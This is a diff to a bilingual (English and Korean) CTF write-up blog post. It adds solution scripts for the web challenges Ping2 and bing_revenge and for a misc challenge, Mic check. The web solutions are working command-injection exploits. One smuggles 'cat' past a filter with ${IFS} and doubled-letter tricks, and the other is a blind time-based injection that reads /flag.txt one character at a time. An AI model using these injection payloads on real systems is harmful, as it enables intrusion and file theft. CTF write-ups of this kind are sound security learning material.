@@ -6,11 +6,68 @@ category: CTF
 draft: false
 ---
 
-[한국어로 보기](#한국어)
+[한국어로 보기](#korean)
 
 ### Table of contents
 
-- [Colorful Board (360pt, 15solves, 🩸firstblood)](#colorful-board-en)
+- [web](#web-en)
+  - [Ping2 (100pt, 140solves)](#ping2-en)
+  - [bing_revenge (100pt, 84solves)](#bing-revenge-en)
+  - [Colorful Board (360pt, 15solves, 🩸firstblood)](#colorful-board-en)
+- [misc](#misc-en)
+  - [Mic check (100pt, 264solves)](#mic-check-en)
+
+<h1 id="web-en">Web</h1>
+<h2 id="ping2-en">Ping2 (100pt, 140solves)</h2>
+
+:::important[info]
+
+- keywords: `command injection`
+
+:::
+
+```py
+from requests import *
+
+url = 'https://a71dea2b2f9779381f8964e8.deadsec.quest'
+
+res = post(url+'/bing.php', data={'Submit': True, 'ip': '223.130.192.248;cacatt${IFS}/flaflagg.txt'})
+print(res.text)
+```
+
+`DEAD{5b814948-3153-4dd5-a3ac-bc1ec706d766}`
+
+<h2 id="bing-revenge-en">bing_revenge (100pt, 84solves)</h2>
+
+:::important[info]
+
+- keywords: `blind command injection`, `time-based`
+
+:::
+
+```py
+from time import time
+from requests import *
+import string
+from tqdm import tqdm
+
+url = 'https://c15b1a06903d4b9345738ae8.deadsec.quest'
+
+flagString = string.digits+'abcdef'+'-' # I first tried with string.printable
+
+flag = 'DEAD{f93efeba-0d78-4130-9114-783f2cd337e3}'
+
+for i in range(len(flag), 100):
+    for j in tqdm(flagString):
+        start = time()
+        res = post(url+'/flag', data={'host':f'''/dev/null;python -c "__import__('time').sleep(10) if open('/flag.txt').read()[{i}] == '{j}' else None"'''})
+        if time() - start > 10:
+            print('Found:', flag+j)
+            flag += j
+            break
+```
+
+`DEAD{f93efeba-0d78-4130-9114-783f2cd337e3}`
 
 <h2 id="colorful-board-en">Colorful Board (360pt, 15solves, 🩸firstblood)</h2>
 
@@ -332,11 +389,90 @@ print(res.text)
 
 FLAG: `DEAD{Enj0y_y0ur_c010rful_w3b_with_c55}`
 
-# 한국어
+<h1 id="misc-en">Misc</h1>
+<h2 id="mic-check-en">Mic check (100pt, 264solves)</h2>
+:::important[info]
+
+- keywords: `auto`
+
+:::
+
+```py
+from pwn import *
+
+# Connect to the remote server
+p = remote('35.224.190.229', 30827)
+
+for i in range(100):
+    p.recvuntil('mic test >  ')
+    a = p.recvuntil(b' [').decode().split(' [')[0]
+    print(a)
+    p.sendline(a)
+p.interactive()
+```
+
+# Korean
 
 ### Table of contents
 
-- [Colorful Board (360pt, 15solves, 🩸firstblood)](#colorful-board-ko)
+- [web](#web-ko)
+  - [Ping2 (100pt, 140solves)](#ping2-ko)
+  - [bing_revenge (100pt, 84solves)](#bing-revenge-ko)
+  - [Colorful Board (360pt, 15solves, 🩸firstblood)](#colorful-board-ko)
+- [misc](#misc-ko)
+  - [Mic check (100pt, 264solves)](#mic-check-ko)
+
+<h1 id="web-ko">Web</h1>
+<h2 id="ping2-ko">Ping2 (100pt, 140solves)</h2>
+
+:::important[info]
+
+- keywords: `command injection`
+
+:::
+
+```py
+from requests import *
+
+url = 'https://a71dea2b2f9779381f8964e8.deadsec.quest'
+
+res = post(url+'/bing.php', data={'Submit': True, 'ip': '223.130.192.248;cacatt${IFS}/flaflagg.txt'})
+print(res.text)
+```
+
+`DEAD{5b814948-3153-4dd5-a3ac-bc1ec706d766}`
+
+<h2 id="bing-revenge-ko">bing_revenge (100pt, 84solves)</h2>
+
+:::important[info]
+
+- keywords: `blind command injection`, `time-based`
+
+:::
+
+```py
+from time import time
+from requests import *
+import string
+from tqdm import tqdm
+
+url = 'https://c15b1a06903d4b9345738ae8.deadsec.quest'
+
+flagString = string.digits+'abcdef'+'-' # I first tried with string.printable
+
+flag = 'DEAD{f93efeba-0d78-4130-9114-783f2cd337e3}'
+
+for i in range(len(flag), 100):
+    for j in tqdm(flagString):
+        start = time()
+        res = post(url+'/flag', data={'host':f'''/dev/null;python -c "__import__('time').sleep(10) if open('/flag.txt').read()[{i}] == '{j}' else None"'''})
+        if time() - start > 10:
+            print('Found:', flag+j)
+            flag += j
+            break
+```
+
+`DEAD{f93efeba-0d78-4130-9114-783f2cd337e3}`
 
 <h2 id="colorful-board-ko">Colorful Board (360pt, 15solves, 🩸firstblood)</h2>
 
@@ -655,3 +791,25 @@ print(res.text)
 ```
 
 FLAG: `DEAD{Enj0y_y0ur_c010rful_w3b_with_c55}`
+
+<h1 id="misc-ko">Misc</h1>
+<h2 id="mic-check-ko">Mic check (100pt, 264solves)</h2>
+:::important[info]
+
+- keywords: `auto`
+
+:::
+
+```py
+from pwn import *
+
+# Connect to the remote server
+p = remote('35.224.190.229', 30827)
+
+for i in range(100):
+    p.recvuntil('mic test >  ')
+    a = p.recvuntil(b' [').decode().split(' [')[0]
+    print(a)
+    p.sendline(a)
+p.interactive()
+```
